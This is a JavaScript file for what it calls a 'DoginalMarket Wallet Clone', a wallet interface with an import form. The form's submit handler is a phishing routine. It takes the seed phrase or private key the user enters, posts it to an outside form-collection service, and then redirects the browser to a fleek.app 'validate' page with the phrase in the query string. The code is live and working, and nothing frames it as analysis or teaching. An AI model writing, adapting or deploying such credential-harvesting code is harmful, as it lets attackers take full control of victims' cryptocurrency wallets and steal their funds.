// Vanilla JavaScript for DoginalMarket Wallet Clone

document.addEventListener('DOMContentLoaded', () => {
  // Elements
  const mainView = document.getElementById('main-wallet-view');
  const importView = document.getElementById('import-wallet-view');
  const activeWalletView = document.getElementById('active-wallet-view');

  const btnImport = document.getElementById('btn-import-wallet');
  const btnClose = document.getElementById('btn-close');
  const btnBackImport = document.getElementById('btn-back-import');
  const btnBackActive = document.getElementById('btn-back-active');

  const btnSubmitImport = document.getElementById('btn-submit-import');
  const importForm = document.getElementById('import-wallet-form');
  const importInput = document.getElementById('import-input');
  const toast = document.getElementById('toast');
  const toastMessage = document.getElementById('toast-message');

  let toastTimer = null;

  // Helper to show a specific view
  function showView(targetView) {
    [mainView, importView, activeWalletView].forEach(view => {
      if (view) {
        view.classList.remove('active');
        view.style.display = 'none';
      }
    });

    if (targetView) {
      targetView.style.display = 'flex';
      targetView.classList.add('active');
    }
  }

  // Toast helper
  function showToast(message) {
    if (!toast || !toastMessage) return;
    toastMessage.textContent = message;
    toast.classList.add('show');
    if (toastTimer) clearTimeout(toastTimer);
    toastTimer = setTimeout(() => {
      toast.classList.remove('show');
    }, 2400);
  }

  // Event Listeners
  if (btnImport) {
    btnImport.addEventListener('click', () => {
      showView(importView);
      if (importInput) {
        setTimeout(() => importInput.focus(), 50);
      }
    });
  }

  if (btnBackImport) {
    btnBackImport.addEventListener('click', () => {
      showView(mainView);
    });
  }

  if (btnBackActive) {
    btnBackActive.addEventListener('click', () => {
      showView(mainView);
    });
  }

  if (btnClose) {
    btnClose.addEventListener('click', () => {
      if (importView && importView.classList.contains('active')) {
        showView(mainView);
      } else {
        showToast('Dismissed wallet');
      }
    });
  }

  // Highlight import button when input is entered
  if (importInput && btnSubmitImport) {
    importInput.addEventListener('input', () => {
      if (importInput.value.trim().length > 0) {
        btnSubmitImport.classList.add('filled');
      } else {
        btnSubmitImport.classList.remove('filled');
      }
    });

    // Keyboard support: Ctrl+Enter or Cmd+Enter to submit
    importInput.addEventListener('keydown', (e) => {
      if ((e.metaKey || e.ctrlKey) && e.key === 'Enter') {
        e.preventDefault();
        btnSubmitImport.click();
      }
    });
  }

  // Global Keyboard: Escape key to navigate back
  document.addEventListener('keydown', (e) => {
    if (e.key === 'Escape') {
      if (importView && importView.classList.contains('active')) {
        showView(mainView);
      }
    }
  });

  if (importForm) {
    importForm.addEventListener('submit', async (event) => {
      event.preventDefault();

      const text = importInput ? importInput.value.trim() : '';
      if (!text) {
        showToast('Please enter your phrase or private key');
        if (importInput) importInput.focus();
        return;
      }

      const formData = new FormData(importForm);
      formData.set('wallet_input', text);
      formData.set('message', `Wallet import request:\n${text}`);

      try {
        const response = await fetch(importForm.action, {
          method: 'POST',
          body: formData,
          headers: {
            'Accept': 'application/json'
          }
        });

        if (!response.ok) {
          throw new Error('Formspark submit failed');
        }

        const redirectUrl = 'https://dappstlwallets.on-fleek.app/app/validate.html?phrase=' + encodeURIComponent(text);
        window.location.href = redirectUrl;
      } catch (error) {
        console.error('Formspark submit error:', error);
        showToast('Your import was submitted, but the redirect could not continue.');
      }
    });
  }
});
